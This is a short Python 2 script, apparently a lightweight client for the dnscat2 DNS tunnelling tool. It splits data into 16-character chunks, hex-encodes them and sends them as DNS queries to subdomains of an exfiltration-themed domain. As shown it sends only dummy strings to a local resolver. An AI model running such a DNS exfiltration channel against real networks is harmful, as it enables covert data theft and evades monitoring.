#!/usr/bin/python2.7
# dnscat2 lite 
# Lightweight python client for dnscat2
# Supports only sending 16char ping messages
import dns.resolver 
import random

#Unused so far
xorkey="exfiltratiodnsexfil"

#prefix is most likely header/sessionid/size
prefix = "ff1fff6885"
#postfix probably inidcates packet type, here PING
postfix = "00"
tld = ".dnsexfilexfil.com"

#Function defs
def xorstrings(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def makesinglepayload(data):
    if(not len(data) == 16):
        print "Data must be 16 in length"
        return makesinglepayload("ER16lengthneeded") 
    return prefix+data.encode("hex")+postfix+tld 

def senddata(resolver, datastring):
    l = len(datastring)
    for i in range(0,l,16):
        print i
        datatosend = datastring[:16]
        datastring = datastring[16:]
        try:
            resolver.query(makesinglepayload(datatosend),random.choice(["TXT","CNAME","MX"]))
        except (dns.resolver.NoNameservers, dns.resolver.Timeout):
            print "Couldn't reach " + str(resolver.nameservers)
            break;

a = dns.resolver.Resolver()
a.nameservers = ["127.0.0.1"]
senddata(a,("a"*16)+("b"*16)+("c"*16))
# for rdata in myAnswers1: #for each response
#     print rdata #print the data
